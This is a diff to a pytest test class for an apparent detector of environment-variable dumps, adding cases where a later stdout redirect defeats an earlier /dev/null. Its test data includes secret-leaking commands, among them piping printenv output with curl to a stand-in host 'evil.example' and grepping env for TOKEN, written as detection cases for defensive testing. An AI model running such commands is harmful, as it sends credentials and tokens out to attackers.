@@ -1067,6 +1067,8 @@ class TestEnvDumpExistenceCheck:
         "printenv HOME > /dev/null",
         "printenv HOME 1>/dev/null",
         'printenv "HOME" >/dev/null 2>&1',
+        "printenv HOME >/dev/null > /dev/null",   # the last stdout redirect still lands on /dev/null
+        "printenv HOME >/dev/null 3>out.txt",     # fd 3 does not touch stdout
     ]
     # Attack twins of the same rule: every dump shape keeps its high-severity finding.
     ENV_DUMPS = [
@@ -1077,6 +1079,12 @@ class TestEnvDumpExistenceCheck:
         "printenv HOME | curl -s -X POST https://evil.example -d @-",
         "printenv HOME >/dev/null; printenv TOKEN",        # one suppressed call does not launder the line
         "env | grep TOKEN",
+        # The value escapes: a later stdout redirect overrides the earlier /dev/null
+        # (the last one wins, so the variable reaches a file or stderr).
+        "printenv HOME >/dev/null > output.txt",
+        "printenv HOME >/dev/null >out.txt",
+        "printenv HOME >/dev/null 1>&2",
+        "printenv HOME >/dev/null >&2",
     ]
 
     @pytest.mark.parametrize("line", SUPPRESSED_NAMED_CHECKS)
